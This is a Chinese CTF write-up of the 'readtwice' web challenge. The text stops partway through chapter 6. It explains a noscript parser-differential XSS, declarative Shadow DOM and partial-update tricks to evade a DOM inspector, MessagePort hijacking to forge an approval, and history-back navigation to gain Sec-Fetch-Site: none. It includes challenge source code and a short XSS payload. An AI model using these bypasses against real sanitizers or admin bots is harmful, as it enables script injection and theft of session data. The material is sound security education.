# readtwice — 浏览器双解析差异 + MessagePort 劫持 + Fetch Metadata 历史遍历 完整 Writeup

> CTF: PwnSec CTF 2026 (PwnSec 团队) | 难度: Hard | 分值: 260 分（结束时 14 队解出）
>
> 题目来源: https://pwnsec.ctf.ae/app/challenges/readtwice（比赛已结束，实例已销毁）
>
> 题目提示原文：`"This is not a revenge, its a bookmark" - @Macabely`
>
> Flag: `pwnsec{1503fc99f750c466}`

**题目分类：Web 安全**。本题考察的是 **HTML 解析器双态差异（JS 开/关时 noscript 的两种解析方式）+ 声明式 Shadow DOM（Declarative Shadow DOM）+ DPU 声明式部分更新（2026 年 5 月的新特性）+ MessagePort 跨源转发劫持 + Fetch Metadata（Sec-Fetch-Site: none）+ SameSite Lax Cookie 行为** 的组合利用。

核心思路可以用一句话概括：**利用"检查器关着 JS 读一遍、审核器开着 JS 再读一遍"（题目名 readtwice 的含义）时 HTML 解析器产出的两棵不同 DOM 树，让一份在检查时"看起来完全无害"的笔记在真正渲染时执行攻击者脚本；脚本把审核页面内部的通信端口偷渡给攻击者，骗审核页面自己"点了批准"；最后用浏览器历史回退（bookmark，题目提示的谜底）制造一次带 `Sec-Fetch-Site: none` 的"浏览器亲自发起"的导航，通过全部状态检查拿到无 CSP 保护的笔记原文，在受信环境里读到 flag。**

> **关于本篇 writeup 的特殊性**：这道题我在比赛期间没有独立解出。本篇既包含官方解法的完整拆解（来自赛后公开的 writeup 仓库，且我已在本地完整复现验证），也完整记录了我自己 20 多小时的分析过程、三条死路、一个"本地能通但远程不通"的旁路解法，以及最重要的——**为什么我会卡死、卡在哪一步、根源是什么、以后如何根治**。反思部分是本篇的重头戏。

---

## 目录

- [第一章：前置知识——把地基打牢](#第一章前置知识把地基打牢)
- [第二章：题目结构——一个"读两次"的笔记审核系统](#第二章题目结构一个读两次的笔记审核系统)
- [第三章：源码审计——把每一道门锁看清楚](#第三章源码审计把每一道门锁看清楚)
- [第四章：第一道城墙——笔记检查器与 19200 次失败的 fuzz](#第四章第一道城墙笔记检查器与-19200-次失败的-fuzz)
- [第五章：第二个战场——Sec-Fetch-Site: none 的完整实测矩阵](#第五章第二个战场sec-fetch-site-none-的完整实测矩阵)
- [第六章：死局推理——"官方流程不可能触发"与我的旁路解法](#第六章死局推理官方流程不可能触发与我的旁路解法)
- [第七章：真相大白——官方解法逐字节拆解](#第七章真相大白官方解法逐字节拆解)
- [第八章：完整复现——从零到 flag 的每一步](#第八章完整复现从零到-flag-的每一步)
- [第九章：如何防御这类攻击](#第九章如何防御这类攻击)
- [第十章：深度反思——为什么没能独立攻破，如何根治](#第十章深度反思为什么没能独立攻破如何根治)
- [第十一章：总结与工具链](#第十一章总结与工具链)

---

## 第一章：前置知识——把地基打牢

这一章把解题需要的所有概念一次性讲清楚。每一个概念都会先用大白话/类比解释，再给技术细节和代码。已经熟悉的读者可以跳着看，但建议至少扫一遍 1.3、1.4、1.7、1.8——它们是理解最终解法的钥匙。

### 1.1 CTF Web 题的 "admin bot" 模式

很多 CTF Web 题的 flag 不在你（攻击者）手里，而在一个"管理员机器人"手里。机器人是一个真实的浏览器（通常是无头 Chrome/Chromium，由 puppeteer 之类的程序控制），它：

1. 拥有一个含 flag 的登录态（cookie）；
2. 会访问你提交的任意网址（这叫 "report" 或 "提交链接"）；
3. 访问期间，你提交的页面里的 JavaScript 会在机器人浏览器里运行。

你的任务通常是：**想办法让你的 JS 在"目标网站自己的域名"下执行（绕过同源策略），或者骗机器人替你发起只有它才能发起的请求**，最终把 flag 偷出来传到你的服务器。

本题就是这种模式：flag 在机器人浏览器的 session 里，只有"管理员会话"才能调用 `/api/flag` 拿到。

### 1.2 同源策略（SOP）与站点（Site）的概念

**同源策略**：浏览器规定，一个网页只能自由读写"同源"的内容。**源（origin）= 协议 + 域名 + 端口**，三者必须完全一致。

```text
http://localhost:3000  和  http://localhost:4001  →  同源？否！（端口不同 → 源不同）
```

但**站点（site）**是另一个更粗的概念，用于 SameSite Cookie 判断：**站点 = 协议 + 注册域（eTLD+1），不包含端口！**

```text
http://localhost:3000  和  http://localhost:4001  →  同站点？是！（端口不参与站点计算）
http://localhost:3000  和  http://evil.com        →  同站点？否
```

> **核心发现（本篇会用到的关键事实）**：因为站点计算不含端口，SameSite=Lax 的 Cookie 会随"同站点任意端口"的请求一起发送。这是我在分析中实测确认的——它构成了一条旁路解法（第六章）。

### 1.3 HTML 解析器的"双态"：scripting flag 开与关

HTML 解析器解析 `<noscript>` 元素时有一个不为人知的开关行为，这取决于**页面的 scripting flag（是否启用脚本）**：

- **JS 开启**（正常浏览器）：`<noscript>` 的内容被当作 **RAWTEXT（原始文本）**——解析器不解析里面的标签，只扫描 `</noscript>` 结束标记；
- **JS 关闭**（或某些禁脚本环境）：`<noscript>` 的内容被**当作正常标记解析**，里面的 `<div>`、`<a>` 都是真正的元素。

用代码感受这个差异：

```html
<body>
  <noscript><a alt="</noscript><script>alert(1)</script>">x</a></noscript>
</body>
```

- **JS 关闭时**：解析器走进 noscript 开始解析标记，遇到 `<a alt="` 后进入**属性值（双引号）状态**，引号里的 `</noscript><script>alert(1)</script>` 全部只是 alt 属性的**字符串值**——没有任何脚本标签诞生。随后 `">` 结束属性，`x` 是文本，`</a>` 闭合。
- **JS 开启时**：noscript 是 RAWTEXT，解析器**只找 `</noscript>` 这 12 个字符**，根本不管什么引号——于是它在 alt 属性值的**内部**就找到了 `</noscript>` 并提前闭合！接着解析继续，后面的 `<script>alert(1)</script>` 变成了**真实存在的脚本标签**。

**同一份 HTML，两种脚本开关状态下，解析出两棵完全不同的 DOM 树**——这就是本题题目名 "readtwice"（读两次）的核心：检查器关着 JS 读一次，渲染器开着 JS 再读一次。

### 1.4 声明式 Shadow DOM（Declarative Shadow DOM，2021/2023）

普通 Shadow DOM 需要调用 JS 的 `element.attachShadow()` 来创建"影子树"。而**声明式 Shadow DOM** 允许纯 HTML 写法：

```html
<div>
  <template shadowrootmode="open">
    <p>影子内容</p>
  </template>
</div>
```

关键行为（来自 MDN 官方文档原文）：**"该元素在 DOM 中会被其内容（包裹在 ShadowRoot 中）替换，ShadowRoot 挂到父元素上"**——也就是说 `<template shadowrootmode>` 这个标签本身**不会作为子元素留在普通 DOM 树里**，它的内容进入挂在 `<div>` 上的影子树。

这一点为什么致命地重要：如果有一个安全检查在数 `<div>` 有几个子元素（`div.childElementCount`），**影子树里的东西它完全看不见，而 template 标签本身又不在树里**——div 看起来就是空的！

时间线：Chrome 90（2021 年）以 `shadowroot` 属性首发；Chrome 111（2023 年 3 月）标准化为 `shadowrootmode`；Chrome 124（2024 年）全部标准化。

### 1.5 DPU——声明式部分更新（2026 年 5 月的最新特性）

这是三个关键特性里**最新的一个**，也是包括我在内大多数解题者知识盲区的根源。Chrome 官方博客 **2026 年 5 月 19 日**发布了 Declarative Partial Updates（DPU），从 Chrome 148 开始可在实验flag后试用，计划 Chrome 155 正式发布。

> **一个需要诚实标注的版本出入**：按官方博客的口径，DPU 要到 Chrome 155 才默认启用；但本题容器内的 Chromium 152 **不需要任何 flag 就能让 `<?marker>`/`<template for>` 生效**（第八章复现实测，payload 直接通过检查就是证据）。两者并不矛盾——Chrome 的新特性从来不是"某版本一刀切"，而是分阶段灰度：不同里程碑版本、不同构建通道（含 puppeteer 捆绑的 Chromium 构建）的默认开关状态可能不同。对解题者而言正确态度是：**不猜版本号，写 3 行 payload 在目标浏览器里实测**——这也是第八章故障排查表把"Chromium 版本过旧"列为 s.js 不执行首要原因的原因。

它引入了两个互相配合的语法：

```html
<div>
  <?marker name="placeholder">      <!-- 处理指令：一个"占位点"（不是元素！） -->
</div>
...
<template for="placeholder">         <!-- 模板：内容会被"搬运"到占位点 -->
  <p>实际内容</p>
</template>
```

解析完成后，DOM 变成：`<div><p>实际内容</p></div>`——**template 的内容被搬进了 `<?marker>` 所在的位置，而 template 本身"不挂到 DOM 上"**（官方文档原话："Templates with a valid for attribute are not attached to the DOM"）。

注意两个细节：

1. `<?marker ...>` 在 HTML 里本来会被当成"伪注释"（bogus comment），DPU 让它变成了真正的**处理指令节点**——处理指令**不是元素**，不占用 `childElementCount`；
2. 搬运发生在解析器**解析到 `<template for>` 那一刻**——也就是说，文档开头 `<?marker>` 处一开始是空的，内容要等解析器读到文档末尾的 template 才会"飞"过来。

> **这两个细节组合起来就是一个完美的时序武器**：一份"最终 DOM 里 head 恰好有一个 meta 标签"的文档，可以让这个 meta **直到文档解析到末尾才真正出现在 head 里**——在此之前head里没有 CSP，此前解析到的脚本不受限制。第七章会看到这怎么被利用。

### 1.6 CSP（内容安全策略）与多重 CSP 的交集

CSP 是浏览器的内容白名单机制，两种设置方式：

- **HTTP 响应头**：`Content-Security-Policy: default-src 'none'`——对整个文档立即生效；
- **HTML meta 标签**：`<meta http-equiv="content-security-policy" content="default-src 'none'">`——**在解析到这个 meta 时才生效**（这就是 1.5 说的时序武器的靶子）。

当多个 CSP 同时存在时（响应头一个 + meta 一个），浏览器取**交集**（最严格者胜）。

`default-src 'none'` 是最严格策略：默认禁止一切资源加载——脚本、样式、图片、fetch 全部被拦。本题里，笔记如果带着这个 meta 被渲染，笔记自己的 JS 会被掐死。

### 1.7 MessageChannel / MessagePort 与"端口转移"

这是 Web 提供的一对"私有对讲机"：

```javascript
const channel = new MessageChannel();
channel.port1.onmessage = (e) => console.log("收到:", e.data);
// 把 port2 发给另一个窗口（第三个参数 = 转移所有权）
otherWindow.postMessage("你好", "*", [channel.port2]);
```

三条关键规则：

1. **port1 和 port2 互相绑定**，只有持有对端的人能给这一端发消息——外部窗口用普通的 `window.postMessage` **发不进** port 通道；
2. `postMessage` 的第三个参数可以**转移（transfer）端口的所有权**给任意窗口——**跨源也可以**！收到端口的一方就拥有了这条私有通道；
3. 通道只认端口对象，不认来源——**谁拿到 port2，谁就能向 port1 发消息**，port1 的主人无法区分消息真正来自谁。

本题的审核页面正是用这套机制等一个 "ready" 信号——而攻击者只要想办法**截获被转移的 port2**，就能冒充笔记发出 "ready"（第七章的核心步骤）。

### 1.8 Fetch Metadata：Sec-Fetch-Site 头与 "none" 的含义

现代浏览器会给每个请求自动附加 `Sec-Fetch-*` 头，告诉服务器"这个请求是怎么发起的"。其中 `Sec-Fetch-Site` 的取值：

| 值 | 含义 |
|---|---|
| `same-origin` | 发起页面和目标是同源 |
| `same-site` | 同站点（比如 localhost 的两个不同端口） |
| `cross-site` | 跨站点 |
| **`none`** | **请求没有"发起页面"——浏览器亲自发起**（地址栏输入、**点书签**、历史回退重发等） |

关键事实（Chromium 源码注释原话）："Browser-initiated requests with no initiator origin will send `Sec-Fetch-Site: None`"——**网页 JS 无法伪造 none**（它是禁改头），只有浏览器进程发起的导航才会带。

**"点书签"正是题目提示 "its a bookmark" 的谜底**：历史回退（history back）导致的重新请求，就是一次"浏览器亲自发起"的导航——带 `Sec-Fetch-Site: none`。这是绕过本题 `policy()` 检查的唯一门票。

### 1.9 SameSite=Lax Cookie 与 bfcache

**SameSite=Lax**：Cookie 只在（a）同站点请求、或（b）**跨站点的顶层 GET 导航**（点链接、window.open 打开新页）时携带；跨站点的 POST、fetch、iframe 加载一律不带。

**bfcache（前进后退缓存）**：Chrome 会把"离开"的页面整个冻结存进内存，点后退时**直接复活而不重新发请求**。2023 年起的 Chrome（约 117+）连带 `Cache-Control: no-store` 的页面也会进 bfcache——我早期实验据此得出"历史回退不会重新发请求"的**错误**结论（详见第五、十章）。**但**：在特定状态组合下（页面曾打开弹窗、先导航去了 about:blank、响应带 no-store），回退时 Chromium 会**重新发请求**，且这个请求带 `Sec-Fetch-Site: none`——第七章实测证明。

### 1.10 技术栈：Express / express-session / puppeteer

- **Express**：Node.js 最常用的 Web 框架。本题用它写服务端；
- **express-session**：会话中间件。本题配置 `cookie: { httpOnly: true, sameSite: "lax" }`——会话 Cookie 名叫 `sid`，HttpOnly 意味着 JS 读不到它，SameSite=Lax 意味着跨站 POST 不带它；
- **puppeteer**：Node.js 控制真实 Chrome/Chromium 的库。本题 bot 用它启浏览器、开页面、`page.goto()` 访问 URL。**用 CDP（Chrome DevTools Protocol）发起的 `goto()` 导航属于"浏览器亲自发起"，带 `Sec-Fetch-Site: none`**——这个事实贯穿整条攻击链。

---


## 第二章：题目结构——一个"读两次"的笔记审核系统

这一章从使用者视角把整个系统讲清楚：有哪些功能、数据怎么流、flag 藏在哪。先看懂"游戏规则"，才能理解后面每一步攻击在打什么。

### 2.1 功能概述

这是一个叫 "ReadTwice Docs" 的在线笔记站，外加一个"安全审核"流程：

1. **创建笔记**（`POST /create`）：提交标题（≤10 字符）和 HTML 正文（≤512 字符）。正文要经过一个**严格的安全检查器**（第四章详解）——不通过直接拒绝；
2. **举报网址**（`POST /report`）：提交任意 http/https URL。机器人为你走一遍"审核流程"（限速 3 次/分钟，同时只能有一个进行中的审核）；
3. 审核结束时，如果一切"符合流程"，审核系统的某个端点会把**笔记原文（不带任何 CSP 保护头）**吐出来——这就是攻击者的最终目标：让这份原文在机器人的受信环境里被渲染，脚本得以读到 flag。

### 2.2 端点清单

| 端点 | 方法 | 作用 | 关键鉴权 |
|---|---|---|---|
| `/create` | POST | 创建笔记（过检查器） | 无 |
| `/report` | POST | 提交 URL 触发机器人审核 | 限速 3/min |
| `/reports/session` | GET | 建立"管理员会话" | 请求头 `X-Bot-Token` 必须等于秘密 TOKEN |
| `/reports/check?rid=X` | GET | **读两次语义**：第一次访问返回"Opening document."并把状态标记为已访问；第二次访问（需过 policy+consume 检查）**返回笔记原文（无 CSP 头）** | 会话必须 admin |
| `/complete` | POST | 把审核标记为"已批准"（approved=true） | 会话必须 admin + 正确的 id + state 值 |
| `/review?rid=X` | GET | 渲染审核页（内嵌沙箱 iframe 显示笔记） | **只检查 rid 是否匹配，不检查 admin！** |
| `/sandbox?rid=X` | GET | 渲染笔记本体（带 `sandbox allow-scripts` CSP 响应头） | 会话必须 admin + prepared |
| `/api/flag` | GET | 返回 flag | 会话必须 admin + 有进行中的审核 |
| `/reports/arm/:id` | POST | 把审核标记为"已准备"（prepared=true） | 请求头 X-Bot-Token |

### 2.3 机器人的审核流程（review）

机器人收到举报后，按固定顺序执行（同一浏览器上下文，所有页面共享同一份 Cookie）：

```text
第 1 步  sessionPage：带上秘密 TOKEN 访问 /reports/session
         → 服务端给这个浏览器种下 admin 会话 Cookie（sid，SameSite=Lax，HttpOnly）
第 2 步  setupPage：goto /reports/check?rid=X     ←【第一次读】visited=true，返回"Opening document."
第 3 步  setupPage：goto /api/flag                ← 服务端把 flag 缓存进行中的审核对象
第 4 步  服务端直接 POST /reports/arm/X           ← prepared=true
第 5 步  mainPage：goto 你提交的 URL（自动追加 ?rid=X 参数）
         → 同时启动 watchDocument 监听器盯着这个页面的顶层导航
         → 等 10 秒 → 关页面，审核结束
```

### 2.4 审核状态机（六道锁）

`/reports/check` 的第二次访问想拿到笔记原文，必须同时满足：

```javascript
// 服务端伪代码
if (visited                                  // 第一次读已发生（第2步自动完成 ✓）
    && policy(req)                           // Sec-Fetch-Site === "none" 且 Sec-Fetch-Dest === "document"
    && currentReview.prepared                // 第4步自动完成 ✓
    && currentReview.approved                // ★ 必须有人 POST /complete 成功（admin+id+state）
    && currentReview.finalized               // ★ watchDocument 必须看到 mainPage 导航到了 /reports/check?rid=X
    && !currentReview.used)                  // 只能消费一次
```

画成图：

```text
你要的：GET /reports/check?rid=X （第二次）→ 返回无CSP笔记原文 → 读flag → 出flag
                 │
   ┌─────────────┼─────────────┬──────────────┬─────────────┐
   ▼             ▼             ▼              ▼             ▼
 visited ✓    prepared ✓    approved ★     finalized ★   policy ★
(机器人自动)  (机器人自动)  (谁来批准?)     (谁触发导航?)  (sf:none 从哪来?)
```

三颗星就是攻击者要解决的三个难题，也正好对应三个"看起来不可能"：

1. **approved**：`/complete` 需要 admin 会话 + 正确的 state 值——攻击者两样都没有；
2. **finalized**：必须让 mainPage（机器人正在访问你网址的那个页面）**自己导航到 check 地址**——你的页面是跨站的，普通跳转可以做到（会被 watchDocument 记录），但这引出第 3 题；
3. **policy**：那次 check 导航请求必须带 `Sec-Fetch-Site: none`——而网页 JS 发起的一切导航都带不了 none（第一章 1.8）！

> **核心发现**：这道题的三颗星环环相扣——approved 需要合法的审核流程配合（第七章的端口劫持），finalized 和 policy 需要同一次导航同时满足（第七章的历史回退）。任何一颗单独看都"不可能"，组合起来才是完整解法。

### 2.5 watchDocument：机器人盯着你的页面干什么

第 5 步启动的监听器逻辑（简化）：

```javascript
page.on("request", (req) => {
  if (!req.isNavigationRequest() || req.frame() !== page.mainFrame()) return; // 只看顶层导航
  const next = req.url();
  if (!entered) {                       // 第一个导航 = 你提交的 URL
    entered = (next 去掉hash后 === 入口URL);
    diverged = !entered;
    return;
  }
  if (next 是 "http://localhost:3000/reports/check?rid=我的id") {
    report.finalized = report.approved && !diverged;   // ★ 在"导航请求发出的那一刻"设置
    return;
  }
  if (next 去掉hash后 !== 入口URL) {   // 去了别的网站
    diverged = true; report.finalized = false;
  }
});
```

两个要点：

- **finalized 在导航请求发出时就被设置**（不是响应回来后）——这决定了"让 mainPage 去一次 check 地址"本身就是设置 finalized 的手段；
- 一旦 mainFrame 中途去了非入口的第三站，`diverged=true`，finalized 会被清掉——所以攻击者的导航序列必须**干净**：入口 → （回退重进）→ check，不能乱跳。

---


## 第三章：源码审计——把每一道门锁看清楚

题目提供了完整源码（Docker 镜像 + Node.js 源文件）。这一章把三份关键源码逐段讲透：服务端 `server.js`、机器人 `bot.js`、审核页模板 `review.ejs`。理解每一行，才知道哪里有缝。

### 3.1 服务端的安全配置（先看"免疫系统"）

```javascript
app.use(helmet({
  contentSecurityPolicy: false,        // 不设全局 CSP（各端点自己管自己）
  crossOriginOpenerPolicy: false,      // 不设 COOP —— 跨源窗口保留 opener 关系（第七章会用到！）
}));
app.use(session({
  store: new MemoryStore(...),
  name: "sid",                         // 会话 Cookie 名
  cookie: { httpOnly: true, sameSite: "lax" },   // ★ HttpOnly + 显式 SameSite=Lax
}));
```

helmet 默认还给所有响应加了：`X-Frame-Options: SAMEORIGIN`（别的网站不能 iframe 本站页面）、`X-Content-Type-Options: nosniff`（禁止 MIME 嗅探）、`Referrer-Policy: no-referrer`（不发 Referer）。这三条各自堵死了一条偷数据的路。

### 3.2 检查器 inspectDocument（bot.js）——"关着 JS 读第一遍"

```javascript
async function inspectDocument(source) {
  browser = await puppeteer.launch({ headless: "new", args: [...] });
  const page = await browser.newPage();
  await page.setJavaScriptEnabled(false);   // ★ 关掉 JS —— noscript 按标记解析（第一章1.3）
  await page.setOfflineMode(true);          // 断网 —— 防止检查时外联
  await page.setContent(source, { waitUntil: "domcontentloaded", timeout: 5000 });
  return await page.evaluate(() => {
    const declaration = document.head.firstElementChild;
    const surface = document.body.firstElementChild;
    const attributeProfile = [ /* html/head/body/div 一律不准有属性；meta 只准有 http-equiv 和 content */ ];
    return document.doctype?.name === "html"
      && document.head.childElementCount === 1          // head 里恰好 1 个元素
      && declaration?.localName === "meta"              // 且必须是 meta
      && declaration.httpEquiv.toLowerCase() === "content-security-policy"
      && declaration.content === "default-src 'none'"   // 且 content 必须一字不差是这个
      && document.body.childElementCount === 1          // body 里恰好 1 个元素
      && surface?.localName === "div"                   // 且必须是 div
      && surface.childElementCount === 0                // 且 div 里 0 个子元素
      && document.body.textContent.trim() === ""        // body 文本只准是空白
      && attributeProfile;
  });
}
```

用一句话概括检查器：**最终的 DOM 必须长成 `head 里一个 CSP meta + body 里一个空 div`，别的什么都不许有**。注释、文本节点、处理指令这些"非元素"节点不被计数——这个"盲区"正是解法的入口。

还要注意一个细节：检查器用 `setContent`（把字符串直接写进页面），渲染器走真实网络响应——两者的差异维度我在第四章逐一验证过（结论：编码、基址等维度全部无差异，唯一有差异的就是 scripting flag）。

### 3.3 审核页 review.ejs——通信协议的中心

```html
<iframe id="viewer" sandbox="allow-scripts"
        src="/sandbox?rid=<%= encodeURIComponent(id) %>"></iframe>
<script nonce="<%= nonce %>">
  const viewer = document.getElementById("viewer");
  const report = <%- JSON.stringify({ id, state }) %>;   // ★ id + state(机密nonce) 印在页面上
  viewer.addEventListener("load", () => {
    const channel = new MessageChannel();
    channel.port1.onmessage = async (event) => {
      if (event.data !== "ready") return;      // ★ 只认端口消息里的 "ready" 字符串
      channel.port1.close();
      await fetch("/complete", {               // ★ 用自己的 admin 身份去点批准
        method: "POST", body: JSON.stringify(report),
      });
    };
    viewer.contentWindow.postMessage("render", "*", [channel.port2]);  // ★ port2 送进沙箱iframe
  }, { once: true });
</script>
```

逐条解读这段代码的"信任模型"：

1. 审核页（localhost:3000 同源、admin 会话）把 **port2 转移给沙箱里的笔记**，然后等 port1 收到 `"ready"`；
2. 收到后，它**自己**带着 admin Cookie 去请求 `/complete`——**攻击者从头到尾不需要拥有 admin 会话**，只需要骗这一段代码执行；
3. `report` 对象里的 `state` 是每次审核随机生成的 32 位十六进制 nonce——但注意 `/review` 这个端点**只验证 rid 不验证 admin**（2.2 表格），任何知道 rid 的人都能把页面拿下来看到 nonce；
4. iframe 的 `sandbox="allow-scripts"` 没带 `allow-same-origin`——笔记在 iframe 里是**透明源（opaque origin）**，读不了父页面 Cookie，也改不了父页面 DOM。但它**可以运行脚本、可以 postMessage 给任何它够得着的窗口**（包括 `parent.opener`——第七章的关键）。

> **核心发现**：这套 "ready → /complete" 机制就是出题人设计的"官方批准通道"。我中期曾错误证明它"永远不可能被合法笔记触发，是烟雾弹"（第六章）——实际上它是正解的核心组件，缺的不是机制而是"让笔记开口说话"的检查绕过。

### 3.4 渲染端点 /sandbox 与它的双重 CSP

```javascript
app.get("/sandbox", (req, res) => {
  if (!reviewMatches(req) || !currentReview.prepared || !req.session.admin) return 404;
  const note = notes.get(currentReview.noteId);
  if (!note) return 404;
  res.setHeader("Content-Security-Policy",
    "sandbox allow-scripts; base-uri 'none'; frame-ancestors 'self'");
  res.type("html").send(note.html);    // ★ 笔记原文 + 上述响应头，仅此而已
});
```

注意：这个响应头的 CSP **没有 default-src、没有 script-src**——它本身不拦脚本。真正拦脚本的是笔记自带的 meta CSP（检查器强制要求的 `default-src 'none'`）。两份 CSP 取交集生效。**我在本地实测**：向真实 /sandbox iframe 注入脚本，被 meta CSP 拦截（报错 `Executing inline script violates ... default-src 'none'`）——所以"笔记带脚本"这条路在 2021 年老技术的视野里确实是死的，必须用 1.5 的时序武器让脚本抢在 meta 生效前跑。

### 3.5 本地环境与插桩

复现环境：`docker compose up`（端口 3001→3000），容器内 Chromium 152 与远程一致。为了观察服务端内部状态，我给源码加了日志插桩（`/review`、`/sandbox`、`/complete`、`/reports/check` 每次请求都把 rid、admin、六个状态位、Sec-Fetch 头写进 `/tmp/proof.txt`）——第八章复现时的"逐行证据"全部来自这份日志。同时保留了一个**仅本地**的 `/debug/note` 后门（跳过检查器存笔记）用于对照实验——注意：这个后门远程不存在，它曾让我产生过"攻击链已打通"的错觉（第六章）。

---


## 第四章：第一道城墙——笔记检查器与 19200 次失败的 fuzz

检查器要求"最终 DOM = 一个 CSP meta + 一个空 div"（3.2）。要让攻击脚本进入审核流程，必须造出一份**检查时符合这个形状、渲染时长出脚本**的笔记。这一章记录我攻打这座城墙的全过程——以及为什么 19200 次尝试全部失败。

### 4.1 思路：找"两次解析"的差异维度

检查器（关 JS、离线、setContent）和渲染器（开 JS、在线、网络响应）是"同一份字符串的两次解析"。两者所有可能的差异维度：

| 维度 | 检查时 | 渲染时 | 有差异吗 |
|---|---|---|---|
| scripting flag | 关 | 开 | **有（noscript 双态，1.3）** |
| 网络 | 离线 | 在线 | 无差异（笔记无外联资源） |
| 编码 | setContent 收到字符串 | 响应头 `text/html; charset=utf-8`（实测确认） | 无差异 |
| 基址 URL | about:blank | http://localhost:3000/sandbox | 无差异（笔记无相对地址） |

理论上只剩 noscript 一个维度。我当时的推理是：

> "noscript 在检查时（JS 关）内容按标记解析——里面的 `<a>`、`<div>` 都是**真元素**，会被 childElementCount 数到；渲染时（JS 开）内容变文本——反而变'少'了。而攻击需要的是**渲染时多出元素**（多出一个 script），方向反了，所以 noscript 无法利用。"

**这个推理本身没错，错的是"元素计数无解"这个前提**——第七章会看到，声明式 Shadow DOM 和 DPU 让"内容凭空消失于计数"成为可能。但在当时，我得出结论"维度枯竭"，转向了 fuzz。

### 4.2 三波 fuzz

**第一波：结构性 fuzz（12600 例）**——枚举标签×位置的组合：各种闭合标签、注释、`<template>`、`<svg>`、`<math>`、表格、frameset、重复 html/head/body、未闭合构造……每例同时跑检查器和真实渲染（同一容器同一 Chromium），对比两侧 DOM。

**第二波：无假设随机 fuzz（3000 例）**——从合法模板出发做随机字节变异（插入 `<>`、`"`、`/`、大小写翻转、截断等），2131 例通过检查，**两侧 DOM 差异为 0**。

**第三波：进化 fuzz（3600 例）**——把"通过检查"当适应度，对幸存者继续变异，97 例通过，DOM 差异仍然为 0。

```text
19200 例 fuzz 结论（当时我的记录）：
  检查通过 ⇔ 渲染一致，零差异 → "检查器不可绕过"
```

### 4.3 单点深挖也全部阵亡

对几个"差一点"的方向做了手工深挖，同样失败：

- **编码攻击**（UTF-16 BOM、ISO-2022-JP、GBK 尾字节吞噬）：`res.type("html")` 实测发送 `text/html; charset=utf-8`，浏览器不做嗅探；且 ASCII 标签结构在任何单字节/多字节编码下不变——结构上不可能"渲染时多出标签"；
- **`<noscript>` 反向利用**：如 4.1 分析，方向相反；
- **双 meta / 属性重复 / 大小写 / 空格变体**：要么过不了检查，要么 CSP 解析行为与检查器看到的完全一致；
- **利用 512 字符截断**制造未闭合构造：两侧同一字符串同一解析器，无差异。

### 4.4 这一章的教训（先埋个钩子，第十章展开）

> **核心反思**：字典 fuzz 的否定结果只能证明"**我的字典里**没有答案"，不能证明"不存在答案"。我把 19200 次失败升级成了"不可绕过"的确定性，然后**彻底关闭了这个搜索分支**——把所有后续精力投向了 approve/policy 那两头。事实上答案（shadowrootmode + DPU + noscript 组合）不在任何标准 fuzz 字典里，因为其中一个是 2026 年 5 月才发布的特性。**这是本次解题最大的战略错误。**

---


## 第五章：第二个战场——Sec-Fetch-Site: none 的完整实测矩阵

policy 检查要求那次 check 请求带 `Sec-Fetch-Site: none`（浏览器亲自发起）。这一章记录我在容器内 Chromium 152 上对**所有能想到的导航产生方式**的实测——结果是除 goto 外全部失败，以及一个把我带沟里的错误结论。

### 5.1 实测矩阵（全部在目标同款容器内跑）

| 导航方式 | 实测 Sec-Fetch-Site | 结论 |
|---|---|---|
| puppeteer `page.goto()`（CDP 发起） | **none** ✓ | 唯一确认的 none 来源（机器人流程里有 4 个 goto） |
| goto 后跟 302 重定向跳 | **none**（继承）✓ | 重定向链不破坏 none |
| 页面 `location.href = ...` | same-origin / cross-site | ✗ |
| `window.open()`（含 noopener、noreferrer 各种参数） | same-site / cross-site | ✗ |
| 表单提交（GET/POST） | cross-site | ✗ |
| HTTP `Refresh` 响应头 / `<meta refresh>` | cross-site（同站点跳转时 same-site） | ✗ |
| `location.reload()` | same-origin | ✗ |
| 沙箱 iframe（透明源）发起的导航 | cross-site | ✗ |
| `about:blank` 弹窗再导航 | same-origin（继承 opener） | ✗ |

数据说明：跨站点来源一律 cross-site；`localhost:3940 → localhost:3939` 这种"同主机不同端口"是 same-site（1.2 的站点不含端口，又验证了一次）。

### 5.2 历史回退的两次错误判死刑

**第一次：bfcache 实验。** 我用 puppeteer 做了 back/forward 实验（页面持 IndexedDB 连接试图禁用 bfcache）：`goBack()` 后**服务器没有收到任何新请求**——页面直接从 bfcache 复活。我据此记录："Chromium 152 连 no-store 页面都进 bfcache，历史遍历不会重新发请求 → 这条路死了。"

**第二次：被权威来源锚定。** 我委派的搜索代理找到了 Firefox 官方 bug 库的 **bug 1648825**——"Fetch Metadata 头在 history.back() 场景下发错值"，其中明确写着 **"Chrome sets cross-site"**（对照描述 Chrome 在历史遍历时发 cross-site 而非 none）。Mozilla 按规范修复了自己的实现（"只有用户触发才该发 none"）。我采信了这句对 Chrome 行为的描述，把"遍历=死路"又钉了一颗钉子。

### 5.3 这两个判断错在哪（第七章会实证）

1. 我的 bfcache 实验**简化了场景**：没有开弹窗、没有先导航到 about:blank、页面状态与真实攻击完全不同。在"页面开着弹窗 + 先去了 about:blank + 响应带 no-store"这个组合状态下，Chromium 的回退**真的会重新发请求**（第八章复现日志第 4 行直接可见），而且带的正是 `Sec-Fetch-Site: none`；
2. Firefox bug 里那句 "Chrome sets cross-site" 描述的是**另一个场景**（普通脚本发起的遍历），我没有做本地交叉验证就让它否掉了整条路——**用别人的二手描述替代自己的一手实验，是这题第二大战术错误**。

### 5.4 一个意外收获：SameSite 站点不含端口的实战验证

做矩阵实验时顺带确认：`localhost:3000` 种下的 Lax Cookie 会随发往 `localhost:4001` 的请求一起走（same-site）。当时只把它记进矩阵的一行，没意识到它就是第六章旁路解法的地基——**重要发现往往在"顺带"里，值得为每个意外结果留一句"这能干什么用"**。

---


## 第六章：死局推理——"官方流程不可能触发"与我的旁路解法

检查器攻不破（第四章）、none 拿不到（第五章），我退回来做纯逻辑推演，得出了一个"证明整道题无解"的结论——然后在一个偶然的实验里找到一条**本地可行**的旁路。这一章的两个产物（错误证明、旁路解法）都是重要的学习材料。

### 6.1 "官方流程是烟雾弹"的错误证明

推理链（每一环都做过实测）：

1. 检查器强制笔记 DOM = CSP meta + 空 div → **笔记里不可能有 `<script>` 元素**（元素计数放不下，4.1/4.3）；
2. 即使有脚本，/sandbox 的 meta CSP（`default-src 'none'`）与响应头 CSP 取交集 → **脚本被拦**（实测：向真实 iframe 注入脚本报 CSP 违规）；
3. review.ejs 只认 port1 收到的 "ready"（3.3）→ 没有笔记脚本就没有 "ready" → **review 页面永远不会自己请求 /complete**；
